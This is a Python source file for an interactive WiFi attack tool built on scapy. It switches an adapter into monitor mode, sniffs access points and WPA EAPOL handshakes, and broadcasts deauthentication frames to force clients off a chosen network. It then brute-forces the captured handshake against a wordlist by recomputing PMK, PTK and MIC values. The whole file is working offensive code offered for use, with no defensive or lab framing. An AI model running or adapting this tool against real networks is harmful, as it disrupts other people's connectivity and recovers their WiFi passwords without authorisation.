from os import system, geteuid, listdir
from scapy.layers.dot11 import Dot11Elt, Dot11, RadioTap, Dot11Deauth
from scapy.layers.eap import EAPOL
from scapy.all import Raw, sniff, sendp
from socket import if_nameindex
from InquirerPy import prompt
from InquirerPy.utils import color_print
from InquirerPy.enum import INQUIRERPY_FILL_CIRCLE_SEQUENCE
from threading import Thread
from binascii import hexlify, unhexlify, a2b_hex
from hashlib import pbkdf2_hmac, sha1
from hmac import new as newHmac
from time import sleep

interface = None
pointer = INQUIRERPY_FILL_CIRCLE_SEQUENCE
SSIDList = {}
currentChannel = 0
forceChannel = -1

class APInfo:
    def __init__(self, BSSID, name, channel):
        self.BSSID = BSSID
        self.name = name
        self.channel = channel

        self.packets = []
        self.capturedHandshake = False

        self.clientHandshakes = {}

    def storeHandshakeFrame(self, packet):
        if self.capturedHandshake: return

        clientMac = packet.addr1 if packet.addr2 == self.BSSID else packet.addr2

        if clientMac not in self.clientHandshakes.keys():
            self.clientHandshakes[clientMac] = [packet]
        elif packet[0].load != self.clientHandshakes[clientMac][0].load:
            self.clientHandshakes[clientMac].append(packet)
            self.capturedHandshake = True
            self.packets = self.clientHandshakes[clientMac]
            color_print([("green", f"Captured handshake for network \"{self.BSSID} : {self.name}\"")])

def channelThread():
    global currentChannel
    global forceChannel

    while True:
        for i in range(1, 30):
            channel = i if forceChannel == -1 else forceChannel
            if forceChannel == -1 or currentChannel != forceChannel:
                if system(f"iwconfig {interface} freq {channel} > /dev/null 2>&1") == 0:
                    sleep(0.5)
                    currentChannel = channel

def sniffThread():
    sniff(iface=interface, prn=sniffCallback, store=0)

def sniffCallback(packet):
    if not packet.haslayer(Dot11): return

    try:
        DestMAC = packet.addr1
        SrcMAC = packet.addr2
        BSSID = packet.addr3
    except:
        pass

    try:
        SSIDLen = packet[Dot11Elt].len
        SSID = packet[Dot11Elt].info
    except:
        SSIDLen = 0
        SSID = None

    if SSID != None and packet.type == 0 and packet.subtype == 8:
        global SSIDList

        if BSSID in SSIDList.keys(): return
        SSIDList[BSSID] = APInfo(BSSID, SSID.decode('ascii'), int(ord(packet[Dot11Elt:3].info)))

    if packet.haslayer(EAPOL) and BSSID in SSIDList.keys() and (DestMAC == BSSID or SrcMAC == BSSID):
        SSIDList[BSSID].storeHandshakeFrame(packet)

def doAttack():
    refreshNetworks = True
    while refreshNetworks:
        refresh = "Refresh Networks List"
        back = "Back to Main Menu"

        capturedList = [f"# {mac} : {info.name}" for mac, info in SSIDList.items()]
        if len(capturedList) == 0:
            color_print([("red", "No SSIDs found yet")])
            return
            
        result = prompt({ "message": "Select WiFi Network to DeAuth:", "type": "list", "choices": [refresh, back] + capturedList, "pointer": pointer})

        refreshNetworks = result[0] == refresh
    
    if result[0] == back: return

    targetMac = result[0][2:19]
    print("Sending deauth frames to " + targetMac + "...")

    # Construct the 802.11 frame:
    # addr1 = Destination MAC, addr2 = Source MAC, addr3 = Access Point MAC
    dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=targetMac, addr3=targetMac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    # Send the packet:
    global forceChannel
    
    forceChannel = SSIDList[targetMac].channel
    while currentChannel != forceChannel: pass
    # sleep(10)
    sendp(packet, inter=1, count=5, iface=interface, verbose=1)
    forceChannel = -1

def doCrack():
    back = "Back to Main Menu"

    capturedList = [f"# {mac} : {info.name}" for mac, info in SSIDList.items() if info.capturedHandshake]
    if len(capturedList) == 0:
        color_print([("red", "No handshakes captured yet")])
        return
        
    result = prompt({ "message": "Select Captured Handshake to Crack:", "type": "list", "choices": [back] + capturedList, "pointer": pointer })
    if result[0] == back: return
    targetMac = result[0][2:19]

    wordlistsPath = "./wordlists/"
    result = prompt({ "message": "Select Wordlist", "type": "list", "choices": [back] + [f"# {x}" for x in listdir(wordlistsPath)], "pointer": pointer })
    if result[0] == back: exit()

    wordlist = open(wordlistsPath + result[0][2:], 'r', encoding='latin-1')
    words = wordlist.readlines()
    wordlist.close()
    wordcount = len(words)
    words = (word.rstrip('\n') for word in words)

    print("Cracking password...")
    info = SSIDList[targetMac]

    # Build key data field
    pke = b"Pairwise key expansion"
    apMac = unhexlify(info.packets[0].addr2.replace(':','',5))
    clientMac = unhexlify(info.packets[0].addr1.replace(':','',5))
    anonce = info.packets[0].load[13:45]
    snonce = info.packets[1].load[13:45]

    keyData = min(apMac, clientMac) + max(apMac, clientMac) + min(anonce, snonce) + max(anonce, snonce)
    
    # Sniffed MIC
    sniffedMessageIntegrityCheck = hexlify(info.packets[1][Raw].load)[154:186]

    # WPA data field with zeroed MIC
    wpaData = hexlify(bytes(info.packets[1][EAPOL]))
    wpaData = wpaData.replace(sniffedMessageIntegrityCheck, b"0" * 32)
    wpaData = a2b_hex(wpaData)

    for i, password in enumerate(words):
        if i % 1000 == 0: print(f"Tried {i}/{wordcount}...", end='\r')

        try: password = password.encode("latin")
        except UnicodeEncodeError: continue

        # Calculate Pairwise Master Key
        pairwiseMasterKey = pbkdf2_hmac('sha1', password, info.name.encode('ascii'), 4096, 32)

        # Calculate Pairwise Transient Key
        blen = 64
        i = 0
        R = b""

        while i<=((blen*8+159) /160):
            hmacsha1 = newHmac(pairwiseMasterKey, pke + chr(0x00).encode() + keyData + chr(i).encode(), sha1)
            i += 1
            R = R + hmacsha1.digest()

        pairwiseTransientKey = R[:blen]

        # Calculate password MIC
        passwordMessageIntegrityCheck = newHmac(pairwiseTransientKey[0:16], wpaData, "sha1").hexdigest()
        
        # Compare the MICs
        if passwordMessageIntegrityCheck[:-8] == sniffedMessageIntegrityCheck.decode():
            color_print([("green", f"Password is \"{password.decode()}\"!                ")])
            return
    
    color_print([("red", f"Password not found...")])


def main():
    if geteuid() != 0:
        print("Please run this script as root")
        exit(1)

    interfaces = if_nameindex()
    result = prompt({ "message": "Select WiFi Adapter:", "type": "list", "choices": [f"# {x[1]}" for x in interfaces] + ["Quit"], "pointer": pointer })
    if result[0] == "Quit": exit(0)

    global interface
    interface = result[0][2:]

    print("Turning interface into monitor mode...")
    system(f"ifconfig {interface} down")
    system(f"iwconfig {interface} mode monitor")
    system(f"ifconfig {interface} up")
    # system("airmon-ng check kill")
    # system(f"airmon-ng start {interface}")
    print("Interface turned into monitor mode!")

    Thread(target=channelThread, daemon=True).start()
    Thread(target=sniffThread, daemon=True).start()

    while True:
        attack = "DeAuth WiFi Networks"
        crack = "Crack Captured Handshakes"
        result = prompt({ "message": "Select Action:", "type": "list", "choices": [attack, crack, "Quit"], "pointer": pointer })

        if result[0] == attack: doAttack()
        elif result[0] == crack: doCrack()
        else: quit()

if __name__ == "__main__": main()
